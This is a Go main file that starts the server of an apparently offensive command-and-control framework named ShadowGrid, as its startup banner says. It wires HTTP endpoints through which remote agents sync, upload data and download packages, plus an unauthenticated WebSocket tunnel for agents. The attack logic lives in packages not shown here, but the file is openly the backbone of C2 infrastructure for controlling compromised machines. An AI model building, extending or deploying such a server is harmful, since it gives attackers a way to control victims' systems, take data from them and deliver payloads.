package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"

	"shadowgrid/api"
	"shadowgrid/config"
	"shadowgrid/database"
	"shadowgrid/listener"
)

func main() {
	var (
		port    int
		dbPath  string
		tlsCert string
		tlsKey  string
	)

	flag.IntVar(&port, "port", 0, "Listen port (overrides SG_LISTEN_PORT)")
	flag.StringVar(&dbPath, "db", "", "Database path (overrides SG_DB_PATH)")
	flag.StringVar(&tlsCert, "tls-cert", "", "TLS certificate path")
	flag.StringVar(&tlsKey, "tls-key", "", "TLS key path")
	flag.Parse()

	cfg := config.Load()

	if port > 0 {
		cfg.ListenPort = port
	}
	if dbPath != "" {
		cfg.DBPath = dbPath
	}
	if tlsCert != "" {
		cfg.TLSCert = tlsCert
	}
	if tlsKey != "" {
		cfg.TLSKey = tlsKey
	}

	// Initialize database
	db, err := database.New(cfg.DBPath)
	if err != nil {
		log.Fatalf("[FATAL] Failed to initialize database: %v", err)
	}
	defer db.Close()

	// Create listener handler (for agent sync endpoints)
	lh := &listener.Handler{DB: db, Config: cfg}

	// Create API server
	srv := api.NewServer(db, cfg, lh)

	// Wire agent listener endpoints into the main router
	srv.Router.Post("/api/v1/sync", lh.HandleSync)
	srv.Router.Post("/api/v1/upload", lh.HandleUpload)
	srv.Router.Get("/api/v1/pkg/{id}", lh.HandleDownload)

	// WebSocket tunnel endpoint (agent connects here, no JWT)
	srv.Router.Get("/api/v1/tunnel", srv.TunnelRelay.ServeWs)

	// Auto-start any listeners that were running before server shutdown
	srv.AutoStartListeners()

	addr := fmt.Sprintf("%s:%d", cfg.ListenAddr, cfg.ListenPort)

	log.Println("╔══════════════════════════════════════════╗")
	log.Println("║           SHADOWGRID C2 SERVER           ║")
	log.Println("╠══════════════════════════════════════════╣")
	log.Printf("║  Listen:  %-30s ║\n", addr)
	log.Printf("║  DB:      %-30s ║\n", cfg.DBPath)
	log.Printf("║  Static:  %-30s ║\n", cfg.StaticDir)
	if cfg.TLSCert != "" {
		log.Printf("║  TLS:     %-30s ║\n", "ENABLED")
	} else {
		log.Printf("║  TLS:     %-30s ║\n", "DISABLED (HTTP mode)")
	}
	log.Println("╚══════════════════════════════════════════╝")

	if cfg.TLSCert != "" && cfg.TLSKey != "" {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:      addr,
			Handler:   srv.Router,
			TLSConfig: tlsCfg,
		}
		log.Printf("[SERVER] Starting HTTPS on %s", addr)
		if err := server.ListenAndServeTLS(cfg.TLSCert, cfg.TLSKey); err != nil {
			log.Fatalf("[FATAL] %v", err)
		}
	} else {
		log.Printf("[SERVER] Starting HTTP on %s", addr)
		if err := http.ListenAndServe(addr, srv.Router); err != nil {
			log.Fatalf("[FATAL] %v", err)
		}
	}
}
